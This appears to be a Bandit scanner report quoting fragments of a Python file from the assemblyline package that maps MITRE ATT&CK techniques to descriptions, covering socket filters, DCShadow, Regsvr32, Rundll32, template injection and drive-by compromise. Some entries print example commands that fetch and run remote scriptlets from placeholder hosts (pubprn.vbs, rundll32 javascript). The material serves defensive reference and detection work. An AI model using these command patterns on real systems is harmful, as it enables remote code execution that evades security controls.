5637	                          '2002), is to use the libpcap libraries to sniff for the packets in question. Another method '
5638	                          'leverages raw sockets, which enables the malware to use ports that are already open for use '
5639	                          'by other programs.\n'
5640	                          '\n'
5641	                          'On network devices, adversaries may use crafted packets to enable [Network Device '
5642	                          'Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services '
5643	                          'offered by the device such as telnet.  Such signaling may also be used to open a closed '
5644	                          'service port such as telnet, or to trigger module modification of malware implants on the '
5645	                          'device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted '
5646	                          'packets to attempt to connect to one or more (open or closed) ports, but may also attempt '
5647	                          'to connect to a router interface, broadcast, and network address IP on the same port in '
5648	                          'order to achieve their goals and objectives.(Citation: Cisco Synful Knock '
5649	                          'Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  '
5650	                          'To enable this traffic signaling on embedded devices, adversaries must first achieve and '
5651	                          'leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the '
5652	                          'monolithic nature of the architecture.\n'
5653	                          '\n'
5654	                          'Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. '
5655	                          'Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or '
5656	                          'woken up, by sending a magic packet to it. Once the system is powered on, it may become a '
5657	                          'target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic '
5658	                          'Packet)',
5659	           'name': 'Traffic Signaling',
5660	           'platforms': ['Linux', 'macOS', 'Windows', 'Network']},
5661	 'T1205.001': {'attack_id': 'T1205.001',
5662	               'categories': ['defense-evasion', 'persistence', 'command-and-control'],
5663	               'description': 'Adversaries may use port knocking to hide open ports used for persistence or command '

5680	               'categories': ['defense-evasion', 'persistence', 'command-and-control'],
5681	               'description': 'Adversaries may attach filters to a network socket to monitor then activate backdoors '
5682	                              'used for persistence or command and control. With elevated permissions, adversaries can '
5683	                              'use features such as the `libpcap` library to open sockets and install filters to allow '
5684	                              'or disallow certain types of data to come through the socket. The filter may apply to '
5685	                              'all traffic passing through the specified network interface (or every interface if not '
5686	                              'specified). When the network interface receives a packet matching the filter criteria, '
5687	                              'additional actions can be triggered on the host, such as activation of a reverse '
5688	                              'shell.\n'
5689	                              '\n'
5690	                              'To establish a connection, an adversary sends a crafted packet to the targeted host '
5691	                              'that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) '
5692	                              'Adversaries have used these socket filters to trigger the installation of implants, '
5693	                              'conduct ping backs, and to invoke command shells. Communication with these socket '
5694	                              'filters may also be used in conjunction with [Protocol '
5695	                              'Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters '
5696	                              'passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n'
5697	                              '\n'
5698	                              'Filters can be installed on any Unix-like platform with `libpcap` installed or on '
5699	                              'Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with '
5700	                              '`pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` '
5701	                              'options. Since the socket connection is not active until the packet is received, this '
5702	                              'behavior may be difficult to detect due to the lack of activity on a host, low CPU '
5703	                              'overhead, and limited visibility into raw socket usage.',
5704	               'name': 'Socket Filters',
5705	               'platforms': ['Linux', 'macOS', 'Windows']},

5710	                          'a method of manipulating Active Directory (AD) data, including objects and schemas, by '
5711	                          'registering (or reusing an inactive registration) and simulating the behavior of a DC. '
5712	                          '(Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate '
5713	                          'changes into AD infrastructure for any domain object, including credentials and keys.\n'
5714	                          '\n'
5715	                          'Registering a rogue DC involves creating a new server and nTDSDSA objects in the '
5716	                          'Configuration partition of the AD schema, which requires Administrator privileges (either '
5717	                          'Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n'
5718	                          '\n'
5719	                          'This technique may bypass system logging and security monitors such as security information '
5720	                          'and event management (SIEM) products (since actions taken on a rogue DC may not be reported '
5721	                          'to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and '
5722	                          'delete replication and other associated metadata to obstruct forensic analysis. Adversaries '
5723	                          'may also utilize this technique to perform [SID-History '
5724	                          'Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects '
5725	                          '(such as accounts, access control lists, schemas) to establish backdoors for Persistence. '

5741	                          'network, the lack of certain patches that may indicate vulnerabilities,  or security '
5742	                          'software that may be used to detect or contain remote exploitation. Servers are likely a '
5743	                          'high value target for lateral movement exploitation, but endpoint systems may also be at '
5744	                          'risk if they provide an advantage or access to additional resources.\n'

5871	               'description': 'Adversaries may leverage code repositories to collect valuable information. Code '
5872	                              'repositories are tools/services that store source code and automate software builds. '
5873	                              'They may be hosted internally or privately on third party sites such as Github, GitLab, '
5874	                              'SourceForge, and BitBucket. Users typically interact with code repositories through a '

5905	                              'printer to Active Directory Domain Services. The script may be signed by Microsoft and '

5907	                              'Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For '
5908	                              'example, the following code publishes a printer within the specified domain: '

5911	                              '\n'

5913	                              'sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second '
5914	                              '<code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote '
5915	                              'site. An example command is <code>pubprn.vbs 127.0.0.1 '
5916	                              'script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature '

6153	               'description': 'Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe '
6154	                              'is a command-line program used to register and unregister object linking and embedding '
6155	                              'controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe '
6156	                              'binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)\n'
6157	                              '\n'
6158	                              'Malicious usage of Regsvr32.exe may avoid triggering security tools that may not '
6159	                              'monitor execution of, and modules loaded by, the regsvr32.exe process because of '
6160	                              'allowlists or false positives from Windows using regsvr32.exe for normal operations. '
6161	                              'Regsvr32.exe can also be used to specifically bypass application control using '
6162	                              'functionality to load COM scriptlets to execute DLLs under user permissions. Since '
6163	                              'Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform '
6164	                              'resource locator (URL) to file on an external Web server as an argument during '
6165	                              'invocation. This method makes no changes to the Registry as the COM object is not '
6166	                              'actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the '
6167	                              'technique is often referred to as a "Squiblydoo" and has been used in campaigns '
6168	                              'targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye '
6169	                              'Regsvr32 Targeting Mongolian Gov)\n'
6170	                              '\n'
6171	                              'Regsvr32.exe can also be leveraged to register a COM Object used to establish '
6172	                              'persistence via [Component Object Model '
6173	                              'Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black '
6174	                              'Squiblydoo Apr 2016)',
6175	               'name': 'Regsvr32',

>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_benign/assemblyline-4.6.0.dev5/assemblyline-4.6.0.dev5/assemblyline/common/attack_map.py:6179
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
6178	               'categories': ['defense-evasion'],
6179	               'description': 'Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using '
6180	                              'rundll32.exe, vice executing directly (i.e. [Shared '
6181	                              'Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security '
6182	                              'tools that may not monitor execution of the rundll32.exe process because of allowlists '
6183	                              'or false positives from normal operations. Rundll32.exe is commonly associated with '
6184	                              'executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n'
6185	                              '\n'
6186	                              'Rundll32.exe can also be used to execute [Control '
6187	                              'Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the '
6188	                              'undocumented shell32.dll functions <code>Control_RunDLL</code> and '
6189	                              '<code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe '
6190	                              'to execute. (Citation: Trend Micro CPL)\n'
6191	                              '\n'
6192	                              'Rundll32 can also be used to execute scripts such as JavaScript. This can be done using '
6193	                              'a syntax similar to this: <code>rundll32.exe '
6194	                              'javascript:"\\..\\mshtml,RunHTMLApplication '
6195	                              '";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  '
6196	                              'This behavior has been seen used by malware such as Poweliks. (Citation: This is '
6197	                              'Security Command Line Confusion)\n'
6198	                              '\n'
6199	                              'Adversaries may also attempt to obscure malicious code from analysis by abusing the '
6200	                              'manner in which rundll32.exe loads DLL function names. As part of Windows compatibility '
6201	                              'support for various character sets, rundll32.exe will first check for wide/Unicode then '
6202	                              'ANSI character-supported functions before loading the specified function (e.g., given '
6203	                              'the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe '
6204	                              'would first attempt to execute <code>ExampleFunctionW</code>, or failing that '
6205	                              '<code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). '
6206	                              'Adversaries may therefore obscure malicious code by creating multiple identical '
6207	                              'exported function names and appending <code>W</code> and/or <code>A</code> to harmless '
6208	                              'ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL '
6209	                              'functions can also be exported and executed by an ordinal number (ex: '
6210	                              '<code>rundll32.exe file.dll,#1</code>).\n'
6211	                              '\n'
6212	                              'Additionally, adversaries may use '
6213	                              '[Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing '
6214	                              'DLL file names, file extensions, or function names) to further conceal execution of a '
6215	                              'malicious payload.(Citation: rundll32.exe defense evasion) ',
6216	               'name': 'Rundll32',
6217	               'platforms': ['Windows']},

6223	                              'Shell.(Citation: WinOSBite verclsid.exe)\n'
6224	                              '\n'
6225	                              'Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved '
6226	                              'by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a '
6227	                              'Class ID (CLSID), a unique identification number used to identify COM objects. COM '
6228	                              'payloads executed by verclsid.exe may be able to perform various malicious actions, '
6229	                              'such as loading and executing COM scriptlets (SCT) from remote servers (similar to '
6230	                              '[Regsvr32](https://attack.mitre.org/techniques/T1218/010)). Since the binary may be '
6231	                              'signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass '
6232	                              'application control solutions that do not account for its potential abuse.(Citation: '
6233	                              'LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation: BOHOPS Abusing the COM '
6234	                              'Registry)(Citation: Nick Tyrer GitHub) ',

6268	                              'to manage Windows systems locally or remotely. MMC can also be used to open Microsoft '

6345	                          'scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to '
6346	                          'describe the processing and rendering of data within XML files. To support complex '
6347	                          'operations, the XSL standard includes support for embedded scripting in various languages. '
6348	                          '(Citation: Microsoft XSLT Script Mar 2017)\n'
6349	                          '\n'
6350	                          'Adversaries may abuse this functionality to execute arbitrary files while potentially '
6351	                          'bypassing application control. Similar to [Trusted Developer Utilities Proxy '
6352	                          'Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line '
6353	                          'transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed '
6354	                          'and used to execute malicious JavaScript embedded within local or remote (URL referenced) '
6355	                          'XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not '
6356	                          'installed by default, an adversary will likely need to package it with dropped files. '
6357	                          '(Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML '
6358	                          'source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call '
6359	                          'the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files '
6360	                          'an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\n'
6361	                          '\n'

6388	                          'specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to '
6389	                          'replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP '
6390	                          'archives compromised of various XML files, referred to as parts, containing properties that '
6391	                          'collectively define how a document is rendered.(Citation: Microsoft Open XML July 2017)\n'
6392	                          '\n'
6393	                          'Properties within parts may reference shared public resources accessed via online URLs. For '
6394	                          'example, template properties may reference a file, serving as a pre-formatted document '
6395	                          'blueprint, that is fetched when the document is loaded.\n'
6396	                          '\n'
6397	                          'Adversaries may abuse these templates to initially conceal malicious code to be executed '
6398	                          'via user documents. Template references injected into a document may enable malicious '
6399	                          'payloads to be fetched and executed when the document is loaded.(Citation: SANS Brian '
6400	                          'Wiltse Template Injection) These documents can be delivered via other techniques such as '
6401	                          '[Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared '
6402	                          'Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since '
6403	                          'no typical indicators (VBA macro, script, etc.) are present until after the malicious '
6404	                          'payload is fetched.(Citation: Redxorblue Remote Template Injection) Examples have been seen '
6405	                          'in the wild where template injection was used to load malicious code containing an '
6406	                          'exploit.(Citation: MalwareBytes Template Injection OCT 2017)\n'
6407	                          '\n'
6408	                          'Adversaries may also modify the <code>*\\template</code> control word within an .rtf file '
6409	                          'to similarly conceal then download malicious code. This legitimate control word value is '
6410	                          'intended to be a file destination of a template file resource that is retrieved and loaded '
6411	                          'when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf '
6412	                          'file to insert a template control word field to include a URL resource of a malicious '
6413	                          'payload.(Citation: Proofpoint RTF Injection)(Citation: Ciberseguridad Decoding malicious '
6414	                          'RTF files)\n'

6453	               'categories': ['defense-evasion'],

6455	                              'lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June '
6456	                              '2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are '
6457	                              'commonly managed by ACLs configured by the file or directory owner, or users with the '
6458	                              'appropriate permissions. File and directory ACL implementations vary by platform, but '
6459	                              'generally explicitly designate which users or groups can perform which actions (read, '
6460	                              'write, execute, etc.).\n'
6461	                              '\n'
6462	                              'Windows implements file and directory ACLs as Discretionary Access Control Lists '
6463	                              '(DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies '
6464	                              'the accounts that are allowed or denied access to a securable object. When an attempt '
6465	                              'is made to access a securable object, the system checks the access control entries in '
6466	                              'the DACL in order. If a matching entry is found, access to the object is granted. '
6467	                              'Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)\n'
6468	                              '\n'
6469	                              'Adversaries can interact with the DACLs using built-in Windows commands, such as '
6470	                              '`icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher '
6471	                              'permissions on specific files and folders. Further, '
6472	                              '[PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can '
6473	                              'be used to retrieve or modify file and directory DACLs. Specific file and directory '
6474	                              'modifications may be a required step for many techniques, such as establishing '
6475	                              'Persistence via [Accessibility '
6476	                              'Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization '
6477	                              'Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other '
6478	                              'instrumental binary/configuration files via [Hijack Execution '
6479	                              'Flow](https://attack.mitre.org/techniques/T1574).',

   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
6483	               'categories': ['defense-evasion'],
6484	               'description': 'Adversaries may modify file or directory permissions/attributes to evade access control '
6485	                              'lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June '
6486	                              '2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are '
6487	                              'commonly managed by ACLs configured by the file or directory owner, or users with the '
6488	                              'appropriate permissions. File and directory ACL implementations vary by platform, but '
6489	                              'generally explicitly designate which users or groups can perform which actions (read, '
6490	                              'write, execute, etc.).\n'
6491	                              '\n'
6492	                              'Most Linux and Linux-based platforms provide a standard set of permission groups (user, '
6493	                              'group, and other) and a standard set of permissions (read, write, and execute) that are '
6494	                              'applied to each group. While nuances of each platform’s permissions implementation may '
6495	                              'vary, most of the platforms provide two primary commands used to manipulate file and '
6496	                              'directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> '
6497	                              '(short for change mode).\n'
6498	                              '\n'
6499	                              'Adversarial may use these commands to make themselves the owner of files and '
6500	                              'directories or change the mode if current permissions allow it. They could subsequently '
6501	                              'lock others out of the file. Specific file and directory modifications may be a '
6502	                              'required step for many techniques, such as establishing Persistence via [Unix Shell '
6503	                              'Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or '
6504	                              'tainting/hijacking other instrumental binary/configuration files via [Hijack Execution '
6505	                              'Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and '
6506	                              'Techniques) ',

7137	           'categories': ['initial-access'],
7138	           'description': 'Adversaries may gain access to a system through a user visiting a website over the normal '
7139	                          "course of browsing. With this technique, the user's web browser is typically targeted for "
7140	                          'exploitation, but adversaries may also use compromised websites for non-exploitation '
7141	                          'behavior such as acquiring an [Application Access '
7142	                          'Token](https://attack.mitre.org/techniques/T1550/001).\n'
7143	                          '\n'
7144	                          'Multiple ways of delivering exploit code to a browser exist, including:\n'
7145	                          '\n'
7146	                          '* A legitimate website is compromised where adversaries have injected some form of '
7147	                          'malicious code such as JavaScript, iFrames, and cross-site scripting.\n'
7148	                          '* Malicious ads are paid for and served through legitimate ad providers.\n'
7149	                          '* Built-in web application interfaces are leveraged for the insertion of any other kind of '
7150	                          'object that can be used to display web content or contain a script that executes on the '
7151	                          'visiting client (e.g. forum posts, comments, and other user controllable web content).\n'
7152	                          '\n'
7153	                          'Often the website used by an adversary is one visited by a specific community, such as '
7154	                          'government, a particular industry, or region, where the goal is to compromise a specific '
7155	                          'user or set of users based on a shared interest. This kind of targeted attack is referred '
7156	                          'to a strategic web compromise or watering hole attack. There are several known examples of '
7157	                          'this occurring.(Citation: Lookout-StealthMango)\n'
7158	                          '\n'
7159	                          'Typical drive-by compromise process:\n'
7160	                          '\n'
7161	                          '1. A user visits a website that is used to host the adversary controlled content.\n'
7162	                          '2. Scripts automatically execute, typically searching versions of the browser and plugins '
7163	                          'for a potentially vulnerable version. \n'
7164	                          '    * The user may be required to assist in this process by enabling scripting or active '
7165	                          'website components and ignoring warning dialog boxes.\n'
7166	                          '3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n'
7167	                          '4. If exploitation is successful, then it will give the adversary code execution on the '
7168	                          "user's system unless other protections are in place.\n"
7169	                          '    * In some cases a second visit to the website after the initial scan is required before '
7170	                          'exploit code is delivered.',

7348	                          'store which would prevent this technique from working.\n'
